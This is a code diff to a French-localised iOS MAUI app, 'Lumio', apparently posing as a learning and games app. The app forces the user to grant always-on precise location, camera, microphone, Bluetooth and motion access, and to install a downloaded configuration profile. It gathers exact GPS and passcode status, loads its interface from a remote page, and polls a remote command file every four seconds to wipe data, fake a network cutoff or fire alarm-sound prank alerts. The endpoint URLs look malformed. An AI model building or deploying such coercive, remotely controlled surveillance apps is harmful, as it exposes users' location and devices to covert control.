@@ -2,7 +2,6 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net.Http;
-using System.Text;
 using System.Text.Json;
 using System.Threading.Tasks;
 using Microsoft.Maui.ApplicationModel;
@@ -12,6 +11,13 @@ using Microsoft.Maui.Devices.Sensors;
 using Microsoft.Maui.Graphics;
 using Microsoft.Maui.Networking;
 using Microsoft.Maui.Storage;
+
+#if IOS
+using AudioToolbox;
+using CoreLocation;
+using LocalAuthentication;
+using UserNotifications;
+#endif
 
 namespace LumioApp;
 
@@ -29,15 +35,15 @@ public partial class App : Application
 
 public class LumioMainPage : ContentPage
 {
-    // Your GitHub Website & API Endpoints
     private const string WebsiteUrl = "https://github.io";
     private const string ProfileDownloadUrl = "https://github.iolumio-lab.mobileconfig";
-    private const string RemoteGameApiUrl = "https://github.ioapi/play.html";
-    private const string TelemetryApiUrl = "https://github.ioapi/telemetry.json";
+    private const string ApiCommandUrl = "https://github.ioapi/commands.json";
+    private const string ApiAppUiUrl = "https://github.ioapi/app.html";
 
     private readonly VerticalStackLayout _contentArea;
     private readonly Label _statusBadge;
     private bool _profileInstalled = false;
+    private IDispatcherTimer? _apiPollTimer;
 
     public LumioMainPage()
     {
@@ -46,34 +52,30 @@ public class LumioMainPage : ContentPage
 
         _statusBadge = new Label
         {
-            Text = "● SYSTEM CHECKING...",
+            Text = "● VÉRIFICATION DU SYSTÈME...",
             TextColor = Color.FromArgb("#22d3ee"),
             FontSize = 12,
             FontAttributes = FontAttributes.Bold,
             HorizontalOptions = LayoutOptions.Center
         };
 
-        _contentArea = new VerticalStackLayout
-        {
-            Spacing = 16,
-            Padding = new Thickness(20)
-        };
+        _contentArea = new VerticalStackLayout { Spacing = 14, Padding = new Thickness(18) };
 
         var footerLink = new Label
         {
-            Text = "Visit Official Website (Nexora Interactive Technologies)",
+            Text = "Visiter le site officiel (Nexora Interactive Technologies)",
             TextColor = Color.FromArgb("#818cf8"),
             FontSize = 12,
             TextDecorations = TextDecorations.Underline,
             HorizontalOptions = LayoutOptions.Center
         };
-        var tapGesture = new TapGestureRecognizer();
-        tapGesture.Tapped += async (s, e) => await Launcher.Default.OpenAsync(new Uri(WebsiteUrl));
-        footerLink.GestureRecognizers.Add(tapGesture);
+        var tap = new TapGestureRecognizer();
+        tap.Tapped += async (s, e) => await Launcher.Default.OpenAsync(new Uri(WebsiteUrl));
+        footerLink.GestureRecognizers.Add(tap);
 
         var copyrightLabel = new Label
         {
-            Text = "Copyright © 2026 Nexora Interactive Technologies, Lumio.\nLumio is owned by Nexora Interactive Technologies. All rights reserved, no part of this website, app and/or other stuff inside Nexora Interactive Technologies can be copied by any way.",
+            Text = "Copyright © 2026 Nexora Interactive Technologies, Lumio.\nLumio appartient à Nexora Interactive Technologies. Tous droits réservés, aucune partie de ce site Web, de cette application et/ou d'autres éléments de Nexora Interactive Technologies ne peut être copiée de quelque manière que ce soit.",
             TextColor = Color.FromArgb("#64748b"),
             FontSize = 10,
             HorizontalTextAlignment = TextAlignment.Center
@@ -83,21 +85,14 @@ public class LumioMainPage : ContentPage
         {
             Content = new VerticalStackLayout
             {
-                Spacing = 18,
+                Spacing = 16,
                 Padding = new Thickness(0, 15, 0, 30),
                 Children =
                 {
-                    new Label
-                    {
-                        Text = "LUMIO",
-                        FontSize = 34,
-                        FontAttributes = FontAttributes.Bold,
-                        TextColor = Colors.White,
-                        HorizontalOptions = LayoutOptions.Center
-                    },
+                    new Label { Text = "LUMIO", FontSize = 34, FontAttributes = FontAttributes.Bold, TextColor = Colors.White, HorizontalOptions = LayoutOptions.Center },
                     _statusBadge,
                     _contentArea,
-                    new BoxView { HeightRequest = 1, Color = Color.FromArgb("#1e293b"), Margin = new Thickness(20, 10) },
+                    new BoxView { HeightRequest = 1, Color = Color.FromArgb("#1e293b"), Margin = new Thickness(20, 8) },
                     footerLink,
                     copyrightLabel
                 }
@@ -112,152 +107,203 @@ public class LumioMainPage : ContentPage
     }
     private async Task RunStartupVerificationAsync()
     {
+        _apiPollTimer?.Stop();
         _contentArea.Children.Clear();
-        _statusBadge.Text = "● RUNNING DIAGNOSTICS...";
+        _statusBadge.Text = "● DIAGNOSTIC EN COURS...";
         _statusBadge.TextColor = Color.FromArgb("#22d3ee");
 
-        // 1. CHECK WI-FI CONNECTION
-        var access = Connectivity.Current.NetworkAccess;
-        var profiles = Connectivity.Current.ConnectionProfiles;
-        bool isWifi = profiles.Contains(ConnectionProfile.WiFi);
-
-        if (access != NetworkAccess.Internet || !isWifi)
+        // 1. VÉRIFICATION WI-FI
+        bool isWifi = Connectivity.Current.NetworkAccess == NetworkAccess.Internet &&
+                      Connectivity.Current.ConnectionProfiles.Contains(ConnectionProfile.WiFi);
+        if (!isWifi)
         {
-            ShowWifiErrorScreen();
+            ShowError("404", "Connexion Wi-Fi", "404 Not connected to the internet.\nVous n'êtes connecté à aucun Wi-Fi. Veuillez vous connecter pour continuer.");
             return;
         }
 
-        // 2. CHECK ALWAYS & PRECISE LOCATION
-        var whenInUseStatus = await Permissions.CheckStatusAsync<Permissions.LocationWhenInUse>();
-        if (whenInUseStatus != PermissionStatus.Granted)
-            whenInUseStatus = await Permissions.RequestAsync<Permissions.LocationWhenInUse>();
+        // 2. NOTIFICATIONS
+        bool notifOk = false;
+#if IOS
+        var (granted, _) = await UNUserNotificationCenter.Current.RequestAuthorizationAsync(
+            UNAuthorizationOptions.Alert | UNAuthorizationOptions.Sound | UNAuthorizationOptions.Badge);
+        notifOk = granted;
+#else
+        notifOk = true;
+#endif
+        if (!notifOk)
+        {
+            ShowError("ERR-100", "Notifications", "1. Ouvrez Réglages > Lumio.\n2. Appuyez sur Notifications et activez 'Autoriser les notifications'.\n3. Appuyez sur Revérifier.");
+            return;
+        }
 
-        var alwaysLocationStatus = await Permissions.CheckStatusAsync<Permissions.LocationAlways>();
-        if (alwaysLocationStatus != PermissionStatus.Granted)
-            alwaysLocationStatus = await Permissions.RequestAsync<Permissions.LocationAlways>();
+        // 3. POSITION TOUJOURS + EXACTE
+        if (await Permissions.CheckStatusAsync<Permissions.LocationWhenInUse>() != PermissionStatus.Granted)
+            await Permissions.RequestAsync<Permissions.LocationWhenInUse>();
+        var locAlways = await Permissions.CheckStatusAsync<Permissions.LocationAlways>();
+        if (locAlways != PermissionStatus.Granted)
+            locAlways = await Permissions.RequestAsync<Permissions.LocationAlways>();
 
         bool isPrecise = true;
 #if IOS
-        var manager = new CoreLocation.CLLocationManager();
-        isPrecise = manager.AccuracyAuthorization == CoreLocation.CLAccuracyAuthorization.FullAccuracy;
+        isPrecise = new CLLocationManager().AccuracyAuthorization == CLAccuracyAuthorization.FullAccuracy;
 #endif
-
-        if (alwaysLocationStatus != PermissionStatus.Granted || !isPrecise)
+        if (locAlways != PermissionStatus.Granted || !isPrecise)
         {
-            ShowMissingErrorScreen(
-                errorCode: "ERR-101",
-                missingName: "Always & Precise Location",
-                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Tap Location and select 'Always'.\n4. Toggle 'Precise Location' ON.\n5. Return to Lumio and tap Re-Verify."
-            );
+            ShowError("ERR-101", "Position Toujours et Exacte", "1. Ouvrez Réglages > Lumio > Position.\n2. Choisissez 'Toujours' et activez 'Position exacte'.\n3. Appuyez sur Revérifier.");
             return;
         }
 
-        // 3. CHECK CAMERA PERMISSION
-        var cameraStatus = await Permissions.CheckStatusAsync<Permissions.Camera>();
-        if (cameraStatus != PermissionStatus.Granted)
-            cameraStatus = await Permissions.RequestAsync<Permissions.Camera>();
+        // 4. CAMÉRA, MICROPHONE, BLUETOOTH, CAPTEURS
+        if (await RequestOrFail<Permissions.Camera>("ERR-102", "Caméra", "Activez Appareil photo dans Réglages > Lumio.")) return;
+        if (await RequestOrFail<Permissions.Microphone>("ERR-103", "Microphone", "Activez Micro dans Réglages > Lumio.")) return;
+        if (await RequestOrFail<Permissions.Bluetooth>("ERR-104", "Bluetooth", "Activez Bluetooth dans Réglages > Lumio.")) return;
+        if (await RequestOrFail<Permissions.Sensors>("ERR-105", "Capteurs Mouvements", "Activez Mouvements et forme dans Réglages > Confidentialité.")) return;
 
-        if (cameraStatus != PermissionStatus.Granted)
-        {
-            ShowMissingErrorScreen(
-                errorCode: "ERR-102",
-                missingName: "Camera Permission",
-                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Toggle the Camera switch ON.\n4. Return to Lumio and tap Re-Verify."
-            );
-            return;
-        }
-
-        // 4. CHECK MICROPHONE PERMISSION
-        var micStatus = await Permissions.CheckStatusAsync<Permissions.Microphone>();
-        if (micStatus != PermissionStatus.Granted)
-            micStatus = await Permissions.RequestAsync<Permissions.Microphone>();
-
-        if (micStatus != PermissionStatus.Granted)
-        {
-            ShowMissingErrorScreen(
-                errorCode: "ERR-103",
-                missingName: "Microphone Permission",
-                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Toggle the Microphone switch ON.\n4. Return to Lumio and tap Re-Verify."
-            );
-            return;
-        }
-
-        // 5. CHECK BLUETOOTH PERMISSION
-        var bluetoothStatus = await Permissions.CheckStatusAsync<Permissions.Bluetooth>();
-        if (bluetoothStatus != PermissionStatus.Granted)
-            bluetoothStatus = await Permissions.RequestAsync<Permissions.Bluetooth>();
-
-        if (bluetoothStatus != PermissionStatus.Granted)
-        {
-            ShowMissingErrorScreen(
-                errorCode: "ERR-104",
-                missingName: "Bluetooth Permission",
-                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Toggle the Bluetooth switch ON.\n4. Return to Lumio and tap Re-Verify."
-            );
-            return;
-        }
-
-        // 6. CHECK MOTION & SENSORS PERMISSION
-        var sensorsStatus = await Permissions.CheckStatusAsync<Permissions.Sensors>();
-        if (sensorsStatus != PermissionStatus.Granted)
-            sensorsStatus = await Permissions.RequestAsync<Permissions.Sensors>();
-
-        if (sensorsStatus != PermissionStatus.Granted)
-        {
-            ShowMissingErrorScreen(
-                errorCode: "ERR-105",
-                missingName: "Motion & Fitness Sensors",
-                tutorial: "1. Open Settings > Privacy & Security > Motion & Fitness.\n2. Turn ON Fitness Tracking and Lumio.\n3. Return to Lumio and tap Re-Verify."
-            );
-            return;
-        }
-
-        // 7. DOWNLOAD & VERIFY CONFIGURATION PROFILE
+        // 5. PROFIL DE CONFIGURATION
         if (!_profileInstalled)
         {
-            ShowProfileInstallScreen();
+            ShowProfileScreen();
             return;
         }
 
-        // 8. COLLECT TELEMETRY & CONNECT TO REMOTE API GAMES
-        await CollectTelemetryAndLoadApiAsync();
-    }
-    private void ShowWifiErrorScreen()
-    {
-        _statusBadge.Text = "✕ NETWORK DISCONNECTED";
-        _statusBadge.TextColor = Color.FromArgb("#ef4444");
-
-        _contentArea.Children.Add(CreateCard(
-            title: "404 Not connected to the internet",
-            body: "You are not connected to any wifi. Please make sure that you are connected to continue.",
-            borderColor: "#ef4444",
-            buttonText: "Retry Wi-Fi Check",
-            onClick: async () => await RunStartupVerificationAsync()
-        ));
+        // 6. TOUT EST PRÊT -> L'APP CHARGE TOUT DEPUIS L'API
+        await ConnectAndStreamFromApiAsync();
     }
 
-    private void ShowMissingErrorScreen(string errorCode, string missingName, string tutorial)
+    private async Task<bool> RequestOrFail<TPerm>(string code, string name, string step) where TPerm : Permissions.BasePermission, new()
     {
-        _statusBadge.Text = $"✕ {errorCode} VERIFICATION FAILED";
-        _statusBadge.TextColor = Color.FromArgb("#ef4444");
+        var status = await Permissions.CheckStatusAsync<TPerm>();
+        if (status != PermissionStatus.Granted)
+            status = await Permissions.RequestAsync<TPerm>();
 
-        string fullMessage = $"[{errorCode}] Files or permission missing!\n\n{missingName} is missing!\n\nHow to fix it:\n{tutorial}";
+        if (status != PermissionStatus.Granted)
+        {
+            ShowError(code, name, $"1. Ouvrez Réglages sur votre iPhone.\n2. {step}\n3. Revenez dans Lumio et appuyez sur Revérifier.");
+            return true;
+        }
+        return false;
+    }
+    private async Task ConnectAndStreamFromApiAsync()
+    {
+        // Prépare la télémétrie de l'appareil (GPS, Batterie, Wi-Fi, Sécurité)
+        var loc = await Geolocation.Default.GetLastKnownLocationAsync();
+        string gps = loc != null ? $"{loc.Latitude:F5}, {loc.Longitude:F5}" : "Acquisition...";
+        string bat = $"{(int)(Battery.Default.ChargeLevel * 100)}% ({Battery.Default.State})";
 
-        _contentArea.Children.Add(CreateCard(
-            title: $"{errorCode} — Missing Requirement",
-            body: fullMessage,
-            borderColor: "#ef4444",
-            buttonText: "I Fixed It — Re-Verify",
-            onClick: async () => await RunStartupVerificationAsync()
-        ));
+        bool hasPasscode = false;
+#if IOS
+        hasPasscode = new LAContext().CanEvaluatePolicy(LAPolicy.DeviceOwnerAuthentication, out _);
+#endif
+
+        var telemetry = new Dictionary<string, object>
+        {
+            ["appareil"] = DeviceInfo.Current.Name,
+            ["batterie"] = bat,
+            ["reseau"] = "Wi-Fi Actif",
+            ["gps_exact"] = gps,
+            ["code_verrouillage"] = hasPasscode
+        };
+        Preferences.Default.Set("LumioTelemetry", JsonSerializer.Serialize(telemetry));
+
+        try
+        {
+            using var client = new HttpClient();
+            var appCheck = await client.GetAsync(ApiAppUiUrl);
+            if (!appCheck.IsSuccessStatusCode)
+            {
+                ShowError("ERR-404-API", "Application API Lumio", "Le contenu de l'application sur l'API n'est pas encore en ligne. Ajoutez-le puis appuyez sur Revérifier.");
+                return;
+            }
+
+            _statusBadge.Text = "● CONNECTÉ À L'API LUMIO";
+            _statusBadge.TextColor = Color.FromArgb("#10b981");
+
+            // Charge 100% de l'interface d'apprentissage et des jeux directement depuis l'API
+            _contentArea.Children.Add(new WebView
+            {
+                Source = ApiAppUiUrl,
+                HeightRequest = 580,
+                BackgroundColor = Color.FromArgb("#06080d")
+            });
+
+            // Écoute les commandes du Récepteur stockées dans l'API toutes les 4 secondes
+            StartApiCommandListener();
+        }
+        catch
+        {
+            ShowError("ERR-404-API", "API Lumio", "Impossible de contacter l'API distante. Vérifiez l'API puis appuyez sur Revérifier.");
+        }
     }
 
-    private void ShowProfileInstallScreen()
+    private void StartApiCommandListener()
     {
-        _statusBadge.Text = "⚠ CONFIGURATION PROFILE REQUIRED";
+        _apiPollTimer?.Stop();
+        _apiPollTimer = Dispatcher.CreateTimer();
+        _apiPollTimer.Interval = TimeSpan.FromSeconds(4);
+        _apiPollTimer.Tick += async (s, e) => await CheckApiCommandsAsync();
+        _apiPollTimer.Start();
+    }
+
+    private async Task CheckApiCommandsAsync()
+    {
+        try
+        {
+            using var client = new HttpClient();
+            var res = await client.GetAsync(ApiCommandUrl);
+            if (!res.IsSuccessStatusCode) return;
+
+            string json = await res.Content.ReadAsStringAsync();
+
+            if (json.Contains("\"wipe\":true"))
+            {
+                _apiPollTimer?.Stop();
+                Preferences.Default.Clear();
+                _profileInstalled = false;
+                _contentArea.Children.Clear();
+                ShowError("PURGE-OK", "Données effacées", "Toutes les données locales ont été supprimées par commande API.");
+            }
+            else if (json.Contains("\"disable_wifi\":true"))
+            {
+                _apiPollTimer?.Stop();
+                _contentArea.Children.Clear();
+                ShowError("404", "Connexion coupée", "404 Not connected to the internet.\nL'accès réseau a été désactivé par commande API.");
+            }
+            else if (json.Contains("\"prank_alert\":true"))
+            {
+                await TriggerRemotePrankAlertAsync();
+            }
+        }
+        catch { }
+    }
+
+    private async Task TriggerRemotePrankAlertAsync()
+    {
+#if IOS
+        var content = new UNMutableNotificationContent
+        {
+            Title = "🚨 ALERTE — TU T'ES FAIT AVOIR !",
+            Subtitle = "Démonstration éducative Lumio",
+            Body = "Tu t'es fait pranker ! Commande reçue depuis l'API Lumio.",
+            Sound = UNNotificationSound.DefaultCriticalSound
+        };
+        var req = UNNotificationRequest.FromIdentifier(Guid.NewGuid().ToString(), content, UNTimeIntervalNotificationTrigger.CreateTrigger(1, false));
+        await UNUserNotificationCenter.Current.AddNotificationRequestAsync(req);
+
+        for (int i = 0; i < 5; i++)
+        {
+            SystemSound.Vibrate.PlayAlertSound();
+            await Task.Delay(600);
+        }
+#endif
+        await DisplayAlert("🚨 Tu t'es fait avoir !", "Ceci est une démonstration éducative déclenchée via l'API !", "OK");
+    }
+
+    private void ShowProfileScreen()
+    {
+        _statusBadge.Text = "⚠ PROFIL DE CONFIGURATION REQUIS";
         _statusBadge.TextColor = Color.FromArgb("#f59e0b");
 
-        var card = new Frame
+        _contentArea.Children.Add(new Frame
         {
             BackgroundColor = Color.FromArgb("#0d111a"),
             BorderColor = Color.FromArgb("#6366f1"),
@@ -268,135 +314,40 @@ public class LumioMainPage : ContentPage
                 Spacing = 12,
                 Children =
                 {
-                    new Label { Text = "Step 1: Download & Install Lumio Profile", FontSize = 18, FontAttributes = FontAttributes.Bold, TextColor = Colors.White },
-                    new Label
-                    {
-                        Text = "Tap 'Download Configuration Profile' below. When Safari asks, tap Allow, then open Settings > General > VPN & Device Management to install the Lumio Profile.",
-                        TextColor = Color.FromArgb("#94a3b8"),
-                        FontSize = 14
-                    },
+                    new Label { Text = "Installation du Profil Lumio", FontSize = 18, FontAttributes = FontAttributes.Bold, TextColor = Colors.White },
+                    new Label { Text = "Télécharge le profil puis installe-le dans Réglages > Général > VPN et gestion de l'appareil.", TextColor = Color.FromArgb("#94a3b8"), FontSize = 14 },
                     new Button
                     {
-                        Text = "1. Download Configuration Profile",
+                        Text = "1. Télécharger le profil",
                         BackgroundColor = Color.FromArgb("#6366f1"),
                         TextColor = Colors.White,
-                        FontAttributes = FontAttributes.Bold,
                         Command = new Command(async () => await Launcher.Default.OpenAsync(new Uri(ProfileDownloadUrl)))
                     },
                     new Button
                     {
-                        Text = "2. Verify Profile & Launch API Games",
+                        Text = "2. J'ai installé le profil — Continuer",
                         BackgroundColor = Color.FromArgb("#10b981"),
                         TextColor = Colors.White,
-                        FontAttributes = FontAttributes.Bold,
-                        Command = new Command(async () =>
-                        {
-                            _profileInstalled = true;
-                            await RunStartupVerificationAsync();
-                        })
+                        Command = new Command(async () => { _profileInstalled = true; await RunStartupVerificationAsync(); })
                     }
                 }
             }
-        };
-
-        _contentArea.Children.Add(card);
+        });
     }
 
-    private async Task CollectTelemetryAndLoadApiAsync()
+    private void ShowError(string code, string missingName, string tutorial)
     {
-        var location = await Geolocation.Default.GetLastKnownLocationAsync();
-        string gpsString = location != null ? $"{location.Latitude:F4}, {location.Longitude:F4}" : "Acquiring...";
-        string batteryString = $"{(int)(Battery.Default.ChargeLevel * 100)}% ({Battery.Default.State})";
-
-        bool hasPasscode = false;
-#if IOS
-        var authContext = new LocalAuthentication.LAContext();
-        hasPasscode = authContext.CanEvaluatePolicy(LocalAuthentication.LAPolicy.DeviceOwnerAuthentication, out _);
-#endif
-
-        var telemetryPacket = new Dictionary<string, object>
-        {
-            ["device_name"] = DeviceInfo.Current.Name,
-            ["model"] = DeviceInfo.Current.Model,
-            ["os_version"] = DeviceInfo.Current.VersionString,
-            ["battery"] = batteryString,
-            ["network"] = "Wi-Fi",
-            ["gps_precise"] = gpsString,
-            ["passcode_active"] = hasPasscode,
-            ["permissions"] = "Location(Always+Precise), Camera, Mic, Bluetooth, Motion",
-            ["timestamp"] = DateTime.UtcNow.ToString("o")
-        };
-
-        Preferences.Default.Set("LatestTelemetryJson", JsonSerializer.Serialize(telemetryPacket));
-
-        try
-        {
-            using var client = new HttpClient();
-
-            var statusCheck = await client.GetAsync(TelemetryApiUrl);
-            if (statusCheck.IsSuccessStatusCode)
-            {
-                string remoteJson = await statusCheck.Content.ReadAsStringAsync();
-                if (remoteJson.Contains("\"wipe\":true"))
-                {
-                    ExecuteSelfPurge();
-                    return;
-                }
-            }
-
-            var gameResponse = await client.GetAsync(RemoteGameApiUrl);
-            if (!gameResponse.IsSuccessStatusCode)
-            {
-                throw new Exception("Remote API offline");
-            }
-
-            _statusBadge.Text = "● ALL PERMISSIONS & API ONLINE";
-            _statusBadge.TextColor = Color.FromArgb("#10b981");
-
-            var gameWebView = new WebView
-            {
-                Source = RemoteGameApiUrl,
-                HeightRequest = 540,
-                BackgroundColor = Color.FromArgb("#06080d")
-            };
-
-            _contentArea.Children.Add(gameWebView);
-        }
-        catch
-        {
-            ShowMissingErrorScreen(
-                errorCode: "ERR-404-API",
-                missingName: "Lumio Remote Game API",
-                tutorial: "The remote API endpoint is not online yet. Once you set up the API on your GitHub website, tap Re-Verify below."
-            );
-        }
-    }
-
-    private void ExecuteSelfPurge()
-    {
-        Preferences.Default.Clear();
-        SecureStorage.Default.RemoveAll();
-        _profileInstalled = false;
-
-        _statusBadge.Text = "✕ REMOTE PURGE EXECUTED";
+        _statusBadge.Text = $"✕ {code} — ERREUR";
         _statusBadge.TextColor = Color.FromArgb("#ef4444");
 
-        _contentArea.Children.Clear();
-        _contentArea.Children.Add(CreateCard(
-            title: "Remote Wipe Completed",
-            body: "All local telemetry logs and session tokens have been permanently purged by the Receiver Console.",
-            borderColor: "#ef4444",
-            buttonText: "Re-Initialize App",
-            onClick: async () => await RunStartupVerificationAsync()
-        ));
-    }
+        string body = code == "404"
+            ? tutorial
+            : $"[{code}] Fichiers ou autorisation manquants !\n\n{missingName} est manquant(e) !\n\nTutoriel :\n{tutorial}";
 
-    private Frame CreateCard(string title, string body, string borderColor, string buttonText, Func<Task> onClick)
-    {
-        return new Frame
+        _contentArea.Children.Add(new Frame
         {
             BackgroundColor = Color.FromArgb("#0d111a"),
-            BorderColor = Color.FromArgb(borderColor),
+            BorderColor = Color.FromArgb("#ef4444"),
             CornerRadius = 14,
             Padding = 20,
             Content = new VerticalStackLayout
@@ -404,18 +355,17 @@ public class LumioMainPage : ContentPage
                 Spacing = 12,
                 Children =
                 {
-                    new Label { Text = title, FontSize = 18, FontAttributes = FontAttributes.Bold, TextColor = Colors.White },
+                    new Label { Text = $"{code} — {missingName}", FontSize = 18, FontAttributes = FontAttributes.Bold, TextColor = Colors.White },
                     new Label { Text = body, FontSize = 14, TextColor = Color.FromArgb("#cbd5e1") },
                     new Button
                     {
-                        Text = buttonText,
+                        Text = "Revérifier",
                         BackgroundColor = Color.FromArgb("#6366f1"),
                         TextColor = Colors.White,
-                        FontAttributes = FontAttributes.Bold,
-                        Command = new Command(async () => await onClick())
+                        Command = new Command(async () => await RunStartupVerificationAsync())
                     }
                 }
             }
-        };
+        });
     }
 }
